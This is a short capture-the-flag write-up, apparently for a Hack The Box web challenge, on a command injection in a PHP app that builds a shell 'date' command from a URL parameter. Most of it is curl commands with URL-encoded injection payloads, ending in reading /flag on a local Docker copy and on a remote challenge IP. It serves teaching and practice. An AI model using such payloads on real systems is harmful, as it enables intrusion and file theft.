# timekorp

## Solution


```sh
unzip ~/Downloads/web_timekorp.zip -d .

sudo docker build -t timekorp .
sudo docker run -d -p 1337:80 timekorp
# docker exec -it CONTAINER_ID mysql -u root -p password

curl http://127.0.0.1:1337/?format=%Y-%m-%d | grep -B 1 -A 2 "It's"

curl http://127.0.0.1:1337/?format=%Y-%m-%d | grep -B 1 -A 2 "It's"

# https://www.urlencoder.org/

# '; echo 'hello
curl http://127.0.0.1:1337/?format=%27%3Becho%20%27hello | grep -B 1 -A 2 "It's"

# ';echo '$PWD
curl http://127.0.0.1:1337/?format=%27%3Becho%20%27%24PWD | grep -B 1 -A 2 "It's"

# ';echo "$PWD"'
curl http://127.0.0.1:1337/?format=%27%3Becho%20%22%24PWD%22%27 | grep -B 1 -A 2 "It's"

# ';ls'
curl http://127.0.0.1:1337/?format=%27%3Bls%27 | grep -B 1 -A 2 "It's"

# ';cat /flag'
curl http://127.0.0.1:1337/?format=%27%3Bcat%20%2Fflag%27 | grep -B 1 -A 2 "It's"
```

```php
// TimeModel.php
$this->command = "date '+" . $format . "' 2>&1";

// adding stuff

// TimeModel.php
public function getCommand() {
    return $this->command;
}

// TimeController.php
return $router->view('index', ['time' => $time->getTime(), 'command' => $time->getCommand()]);

// views/index.php
<code><?= $command ?></code>
```

```sh
curl http://83.136.253.126:44471/?format=%27%3Bcat%20%2Fflag%27 | grep -B 1 -A 2 "HTB{"
```